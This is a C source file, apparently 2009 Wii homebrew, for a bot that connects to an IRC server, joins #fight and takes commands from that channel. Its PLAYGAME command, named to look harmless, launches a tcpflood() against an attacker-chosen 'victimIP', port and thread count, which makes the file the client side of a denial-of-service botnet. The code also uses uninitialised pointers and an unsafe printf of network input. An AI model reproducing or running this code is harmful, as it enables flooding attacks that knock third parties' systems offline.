#include "irc.h"
#include <ogc/lwp_watchdog.h>
#include <sys/types.h>
#include <stdlib.h>

/*	Author: Pete Hoang
		Date:   02-24-2009
*/

static inline u32 wait_for(u32 btn)
{
	u32 btns;
	while(1)
	{
		PAD_ScanPads();
		btns = PAD_ButtonsHeld(0);
		if(btns & btn)
			return btns;
		VIDEO_WaitVSync();
	}
}

void initialise_network() {
    printf("Waiting for network to initialise...\n");
    s32 result = -1;
    while (!check_reset_synchronous() && result < 0) {
        while (!check_reset_synchronous() && (result = net_init()) == -EAGAIN);
        if (result < 0) printf("net_init() failed: [%i] %s, retrying...\n", result, strerror(-result));
    }
    if (result >= 0) {
        u32 ip = 0;
        do {
            ip = net_gethostip();
            if (!ip) printf("net_gethostip() failed, retrying...\n");
        } while (!check_reset_synchronous() && !ip);
        if (ip) printf("Network initialised.  Wii IP address: %s\n", inet_ntoa(*(struct in_addr *)&ip));
    }
}


int ircconnect(char* IP_Address, int port) {
	int simpleSocket = 0;
	int simplePort = 0;
	int returnStatus = 0;
	char buffer[1024] = "";
	struct sockaddr_in simpleServer;


	/* create a streaming socket */
	simpleSocket = net_socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
	if (simpleSocket < 0) {
		fprintf(stderr, "Could not create a socket! Socket #%d\n", simpleSocket);
		return(-1);
	}
	else {
		fprintf(stderr, "Socket created! Socket #%d\n", simpleSocket);
	}
	/* retrieve the port number for connecting */
	simplePort = port;
	/* set up the address structure */
	/* use the IP address argument for the server address */
	memset(&simpleServer, 0, sizeof(simpleServer));
	simpleServer.sin_family = AF_INET;
	simpleServer.sin_addr.s_addr= inet_addr(IP_Address);
	simpleServer.sin_port = htons(simplePort);

	/* connect to IRC Server 8.0.0.101 port 6667 */
	returnStatus = net_connect(simpleSocket, (struct sockaddr *)&simpleServer, sizeof(simpleServer));
	if (returnStatus >= 0) {
		fprintf(stderr, "Connect successful!\n");
	}
	else {
		fprintf(stderr, "Could not connect to address!\n");
		net_close(simpleSocket);
		return(returnStatus);
	}

	/* send IRC Username */
	strcpy(buffer, "USER CSharpBot1 0 * :I'm a C# Mobilebot\r\n");

	returnStatus = net_write(simpleSocket, buffer, strlen(buffer));
	if ( returnStatus > 0 ) {
		printf("%d: %s", returnStatus, buffer);
	} else {
		fprintf(stderr, "Return Status = %d \n", returnStatus);
	}

	/* send IRC Nickname */
	strcpy(buffer, "NICK BotNick\r\n");
	returnStatus = net_write(simpleSocket, buffer, strlen(buffer));
	printf("%s",buffer);

	/* read IRC PING */
	returnStatus = net_read(simpleSocket, buffer, 1024);
	printf("[%s]", buffer);
	if (strncmp(buffer,"PING", 4) == 0)
		{
		/* replace PING with PONG */
		buffer[1]='O';
		/* reply IRC PONG */
		printf("%s",buffer);
		returnStatus = net_write(simpleSocket, buffer, strlen(buffer));

		/* receive welcome message */
		returnStatus = net_read(simpleSocket, buffer, 1024);
		printf("%s", buffer);

		/* JOIN #fight channel*/
		strcpy(buffer, "JOIN #fight\r\n");
		returnStatus = net_write(simpleSocket, buffer, strlen(buffer));
		printf("%s",buffer);

		/* receive confirmation */
		returnStatus = net_read(simpleSocket, buffer, 1024);
		printf("%s", buffer);

	}

	return simpleSocket;
}

int irclisten(int socketno)
{
	int returnStatus = 0;
	char message[1024] = "";
	int  victimPort, threads;
	char *str;
	char *channel, *command, *victimIP;
	char *strPort, *strThreads;

	while (1)
	{
		memset(message, 0, 1024);
		returnStatus = net_read(socketno, message, 1024);
		printf("%s", message);

		if (strncmp(message,"PING", 4) == 0)
		{
			/* replace PING with PONG */
			message[1]='O';
			/* reply IRC PONG */
			returnStatus = net_write(socketno, message, strlen(message));
			printf(message);
		}
		str = strtok(message, " ");
		if (str != NULL)
			str = strtok(NULL, " ");

		if (str != NULL)
			channel = strtok(NULL, " ");
		if (channel != NULL)
			command = strtok(NULL, " :");
		if (command != NULL)
			victimIP = strtok(NULL, " ");
		if (victimIP != NULL)
			strPort = strtok(NULL, " ");
		if (strPort != NULL)
			strThreads = strtok(NULL, " ");

		if (strPort != NULL)
			victimPort = atoi( (const char *) strPort);
		if (strThreads != NULL)
			threads = atoi ( (const char *) strThreads);

		if (command != NULL)
		{
			printf("Command is: [%s]\n",command);
			if (strncmp(command, "HITHERE", 7) == 0)
			{
				strcpy(message,"PRIVMSG #fight :HI from Mobile C# BOT ..\r\n");
				returnStatus = net_write(socketno, message, strlen(message));
			} else
			if (strncmp(command, "AREYOUTHERE", 11) == 0)
			{
				strcpy(message, "PRIVMSG #fight :Yes, I am...\r\n");
				returnStatus = net_write(socketno, message, strlen(message));
			} else
			if (strncmp(command, "PLAYGAME", 8) == 0)
			{

				printf("Calling tcpflood IP: %s port: %d nothreads: %d\n", victimIP, victimPort, threads);
				returnStatus = tcpflood(victimIP, victimPort, threads);


			} else
			if (strncmp(command, "EXITBOT", 7) == 0)
			{
				strcpy(message, "PRIVMSG #fight :QUIT\r\n");
				returnStatus = net_write(socketno, message, strlen(message));
				break;
			}
		}
	}

	return 0;
}
